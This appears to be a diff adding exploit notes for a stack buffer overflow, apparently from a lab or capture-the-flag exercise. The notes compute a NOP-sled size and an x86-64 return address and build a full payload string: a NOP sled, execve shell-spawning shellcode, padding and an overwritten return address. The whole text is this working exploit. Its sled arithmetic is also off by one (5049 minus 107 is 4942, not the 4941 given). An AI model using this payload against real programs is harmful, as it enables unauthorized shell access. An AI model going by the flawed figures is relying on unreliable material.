@@ -1,0 +1,8 @@
+buffer length: 5049 bytes
+shellcode length: 27 bytes
+push padding: 80 bytes
+nop-sled length: 5049-(27+80) = 4941
+ret_offset = 0x7FFFFFFFE4A0 - 0x7FFFFFFFD160 = 0x1340 / 2 = 0x9A0
+ret = 0x7FFFFFFFD160 + 0x9A0 = 0x00007FFFFFFFDB00
+
+payload = "\x90"*4941 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41"*80 + "\x00\xDB\xFF\xFF\xFF\x7F\x00\x00"
